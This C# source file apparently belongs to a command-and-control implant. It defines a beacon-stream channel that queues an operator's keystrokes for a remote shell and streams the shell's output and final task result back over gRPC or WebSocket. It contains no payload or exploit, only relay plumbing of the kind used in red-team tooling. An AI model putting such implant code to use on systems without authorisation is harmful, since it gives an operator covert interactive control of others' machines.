using Google.Protobuf;
using Rod.V1;

namespace Rod.Implant.Internal;

// One live task channel on a beacon stream (architecture.md Sec 10.3):
// shared by the gRPC stream client and the WebSocket stream client, because
// the channel's shape -- the input queue the loop routes ChannelInput frames
// into, the write binding that streams output chunks upstream through the
// stream's write gate, and the delivery task that reports the handler's
// final TaskResult -- is the transport's business only at the write binding.
// Implements IChannelStream, so the handler never touches the transport.

internal sealed class BeaconLiveChannel : IChannelStream
{
    // The input queue bound: operator input arrives at typing speed, and a
    // channel whose shell cannot drain it is stuck -- dropping a queued
    // keystroke is not an option, so a full queue fails the write and the
    // input is logged dropped rather than silently buffered without bound.
    private const int MaxQueuedInputs = 128;

    private readonly string _taskId;
    private readonly Func<Frame, CancellationToken, ValueTask> _writeFrame;
    private readonly System.Threading.Channels.Channel<(byte[]? Data, bool Eof)> _input =
        System.Threading.Channels.Channel.CreateBounded<(byte[]? Data, bool Eof)>(MaxQueuedInputs);

    public BeaconLiveChannel(string taskId, Func<Frame, CancellationToken, ValueTask> writeFrame)
    {
        _taskId = taskId;
        _writeFrame = writeFrame;
    }

    /// <summary>The delivery task reporting this channel's final TaskResult.</summary>
    public Task Delivery { get; set; } = Task.CompletedTask;

    public async ValueTask WriteOutputAsync(ReadOnlyMemory<byte> data, CancellationToken cancellationToken)
    {
        var output = new ChannelOutput
        {
            TaskId = _taskId,
            Data = ByteString.CopyFrom(data.Span),
        };
        await _writeFrame(
            new Frame
            {
                Payload = ByteString.CopyFrom(output.ToByteArray()),
                Kind = FrameKind.ChannelOutput,
            },
            cancellationToken);
    }

    public ValueTask<(byte[]? Data, bool Eof)> ReadInputAsync(CancellationToken cancellationToken)
        => _input.Reader.ReadAsync(cancellationToken);

    // Hands one routed input frame to the handler's parked read. Returns
    // false when the queue is full; the router logs the drop.
    public bool Receive(byte[] data, bool eof) => _input.Writer.TryWrite((data, eof));

    // Completes the input side so a parked read unblocks instead of
    // waiting on input that will never come.
    public void CompleteInput() => _input.Writer.TryComplete();
}
